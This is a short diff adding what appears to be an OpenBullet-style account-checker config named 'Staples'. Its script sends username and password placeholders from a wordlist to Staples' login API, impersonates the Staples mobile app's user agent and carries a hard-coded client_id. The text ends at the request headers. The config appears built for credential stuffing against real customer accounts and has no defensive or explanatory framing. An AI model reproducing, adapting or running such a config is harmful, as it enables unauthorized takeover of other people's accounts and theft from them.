@@ -1,0 +1,32 @@
+[SETTINGS]
+{
+  "Name": "Staples ",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-20T00:23:54.1826101+00:00",
+  "AdditionalInfo": "",
+  "Author": "DADEX55 :cattf:",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api.staples.com/globalplatform/credentials/v1/login?locale=en-US&zipCode=01702&tenantId=StaplesDotCom" AutoRedirect=TRUE 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Staples Mobile App" 
+  HEADER "Pragma: no-cache" 
+  HEADER "client_id: cEU7omipe8PzK2DhUAB1QDgehAu2ez2e" 
